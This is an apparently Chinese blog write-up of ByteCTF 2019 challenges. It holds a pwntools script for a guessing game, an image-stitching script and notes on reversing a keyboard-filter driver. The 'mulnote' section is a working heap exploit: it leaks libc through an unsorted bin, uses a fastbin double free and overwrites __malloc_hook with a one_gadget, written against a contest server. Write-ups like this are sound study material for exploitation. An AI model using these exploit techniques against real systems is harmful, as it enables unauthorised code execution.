---
layout: post
title:  "ByteCTF-Writeup"
date:   2019-9-9
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# ByteCTF-Writeup

* ### betgame

  白给，手速题

  ```python
  from pwn import *
  r = remote('112.125.25.81',9999)
  
  s = ['s','j','b']
  b = ['b','s','j']
  j = ['j','b','s']
  for i in range(0,30):
  	r.recvuntil('I will use: ')
  	fuck = r.recv(1)
  	if fuck == 's':
  		r.sendline(s[i%3])
  	if fuck == 'b':
  		r.sendline(b[i%3])
  	if fuck == 'j':
  		r.sendline(j[i%3])
  r.interactive()
  ```

* ### jigsaw 

  ```python
  # -*- coding:utf-8 -*-
  import os
  from PIL import Image
  import PIL.Image as Image
  import os
   
  IMAGES_PATH = '\\d9710b4ddcbf457cb716ee5423c7f32e\\pics\\'  # 图片集地址
  IMAGES_FORMAT = ['.jpg', '.JPG']  # 图片格式
  IMAGE_SIZE = 64  # 每张小图片的大小
  IMAGE_ROW = 11  # 图片间隔，也就是合并成一张图后，一共有几行
  IMAGE_COLUMN = 21  # 图片间隔，也就是合并成一张图后，一共有几列
  IMAGE_SAVE_PATH = '\\d9710b4ddcbf457cb716ee5423c7f32e\\final.jpg'  # 图片转换后的地址
   
  # 获取图片集地址下的所有图片名称
  image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if
                 os.path.splitext(name)[1] == item]
   
  # 简单的对于参数的设定和实际图片集的大小进行数量判断
  if len(image_names) != IMAGE_ROW * IMAGE_COLUMN:
      raise ValueError("合成图片的参数和要求的数量不能匹配！")
   
  # 定义图像拼接函数
  def image_compose():
      to_image = Image.new('RGB', (IMAGE_COLUMN * IMAGE_SIZE, IMAGE_ROW * IMAGE_SIZE)) #创建一个新图
      # 循环遍历，把每张图片按顺序粘贴到对应位置上
      for y in range(1, IMAGE_ROW + 1):
          for x in range(1, IMAGE_COLUMN + 1):
              from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize(
                  (IMAGE_SIZE, IMAGE_SIZE),Image.ANTIALIAS)
              to_image.paste(from_image, ((x - 1) * IMAGE_SIZE, (y - 1) * IMAGE_SIZE))
      return to_image.save(IMAGE_SAVE_PATH) # 保存新图
  image_compose() #调用函数
  
  ```

  先把图片拼起来

  然后用gaps跑

  ```
  gaps --image=12311.jpg --generations=20 --population=600 --verbose --size=64
  ```

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/suctf2019/1.jpg)

* ### mulnote 

  先搞一个unsorted bin泄露libc

  然后double free改fd申请到malloc_hook，改成one_gadget

  ```python
  from pwn import *
  r = remote('112.126.101.96',9999)
  #r = process('./mulnote')
  elf = ELF('./mulnote')
  libc = ELF('./libc.so')
  def create(size,note):
  	r.sendlineafter('>','C')
  	r.sendlineafter('size>',str(size))
  	r.sendafter('note>',note)
  
  def edit(index,note):
  	r.sendlineafter('>','E')
  	r.sendlineafter('index>',str(index))
  	r.sendafter('new note>',note)
  
  def remove(index):
  	r.sendlineafter('>','R')
  	r.sendlineafter('index>',str(index))
  
  def show():
  	r.sendlineafter('>','S')
  
  
  create(1000,'fuck')
  remove(0)
  show()
  r.recvuntil('note[0]:\n')
  main_arena_88 = u64(r.recvuntil('\n',drop = True).ljust(8,'\x00'))
  main_arena = main_arena_88 - 88
  libc_base = main_arena - 0x3c4b20
  log.success('main_arena:'+hex(main_arena))
  log.success('libc_base:'+hex(libc_base))
  fuck_addr = libc_base + 0x3c4aed
  one = libc_base + 0x4526a
  log.info('fuck_addr:'+hex(fuck_addr))
  log.info('one:'+hex(one))
  create(0x60,'fuck')
  create(0x60,'fuck')
  remove(1)
  remove(2)
  remove(1)
  create(0x60,p64(fuck_addr))
  create(0x60,p64(fuck_addr))
  create(0x60,p64(fuck_addr))
  create(0x60,p8(0)*3 + p64(0)*2 + p64(one))
  
  r.interactive()
  ```

  

* ### 驱动逆向

  给出一组数据

  ```
  这是什么?
  
  25 40 5a 86 b5 f1 3e 58 80 9b db 0b 30 49 66 8c
  
  ```

  处理键盘输入

  关键代码

  ```c
  __int64 __fastcall sub_1400037A0(__int64 a1, __int64 a2)
  {
    int v2; // ST20_4
    unsigned int i; // [rsp+30h] [rbp-28h]
    __int64 v5; // [rsp+38h] [rbp-20h]
    unsigned __int64 v6; // [rsp+40h] [rbp-18h]
    __int64 v7; // [rsp+68h] [rbp+10h]
  
    v7 = a2;
    if ( *(_DWORD *)(a2 + 48) >= 0 )
    {
      v5 = *(_QWORD *)(a2 + 24);
      v6 = *(_QWORD *)(a2 + 56) / 0xCui64;
      for ( i = 0; i < v6; ++i )
      {
        if ( !*(_WORD *)(v5 + 12i64 * i + 4) )
        {
          input[index] = (temp + 42) ^ *(unsigned __int16 *)(v5 + 12i64 * i + 2);
          temp = input[index];
          v2 = input[index];
          DbgPrintEx(77i64, 563i64, "Magic code %d: %02x\n");
          if ( ++index == 16 )
          {
            DbgPrintEx(77i64, 563i64, "Magic code buffer is now full\n");
            index = 0;
            temp = 0;
          }
        }
      }
    }
    --dword_140006080;
    if ( *(_BYTE *)(v7 + 65) )
      sub_140003A20(v7);
    return *(unsigned int *)(v7 + 48);
  }
  ```

  ```python
  data = [0x25,0x40,0x5a,0x86,0xb5,0xf1,0x3e,0x58,0x80,0x9b,0xdb,0x0b,0x30,0x49,0x66,0x8c]
  res = []
  temp = 0
  for i in data:
      res.append(((temp+42)^i)%256)
      temp = i
  print(res)
  ```

  得到扫描码

  ```
  [15, 15, 48, 2, 5, 46, 37, 48, 2, 49, 30, 14, 5, 19, 21, 28]
  ```

  ```c
  Keyboard Scan Codes (Read from Port HEX 60 = DEC 96) (Keyboard Layout)
  
  Top number    ... DEC
  Bottom number ... HEX
  
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  |F1|F2|ESC| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | - | = |BkS|Num Lok|Scr Lok|
  |  |  |   |   |   |   |   |   |   |   |   |   |   |   |   |   |       |       |
  |59|60| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 |10 |11 |12 |13 |14 |  69   |  70   |
  |3B|3C|01 |02 |03 |04 |05 |06 |07 |08 |09 |0A |0B |0C |0D |0E |  45   |  46   |
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  |F3|F4|TAB| Q | W | E | R | T | Y | U | I | O | P | [ | ] |   | 7 3 8 | 9 3 - |
  |  |  |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   3   |   3   |
  |61|62|15 |16 |17 |18 |19 |20 |21 |22 |23 |24 |25 |26 |27 |   |71 372 |73 374 |
  |3D|3E|0F |10 |11 |12 |13 |14 |15 |16 |17 |18 |19 |1A |1B |   |47 348 |49 34A |
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  |F5|F6|CTR| A | S | D | F | G | H | J | K | L | ; | ' | ` |28 | 4 3 5 | 6 3   |
  |  |  |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   3   |   3   |
  |63|64|29 |30 |31 |32 |33 |34 |35 |36 |37 |38 |39 |40 |41 |   |75 376 |77 3   |
  |3F|40|1D |1E |1F |20 |21 |22 |23 |24 |25 |26 |27 |28 |29 |   |4B 34C |4D 3   |
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  |F7|F8|Shf| \ | Z | X | C | V | B | N | M | , | . | / |Shf|Prt| 1 3 2 | 3 3 + |
  |  |  |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   3   |   3   |
  |65|66|42 |43 |44 |45 |46 |47 |48 |49 |50 |51 |52 |53 |54 |55 |78 380 |81 378 |
  |41|42|2A |2B |2C |2D |2E |2F |30 |31 |32 |33 |34 |35 |36 |37 |4F 350 |51 34E |
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  |F9|F0|  A|t  |   |   |   |   |pac|   |   |   |   |Cap|Lok|  I|s  3  D|l  3   |
  |  |  |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   3   |   3   |
  |67|68|  5|   |   |   |   |   |57 |   |   |   |   |  5|   |  8|   3  8|   3   |
  |43|44|  3|   |   |   |   |   |39 |   |   |   |   |  3|   |  5|   3  5|   3   |
  +--+--+---+---+---+---+---+---+---+---+---+---+---+---+---+---+-------+-------+
  
  Extended ASCII Special Key Codes (Numerical Order)
  ```

  输入

  ```
  tab tab b 1 4 c k b 1 n a backspace 4 r y enter
  ```

  然后俺不会了

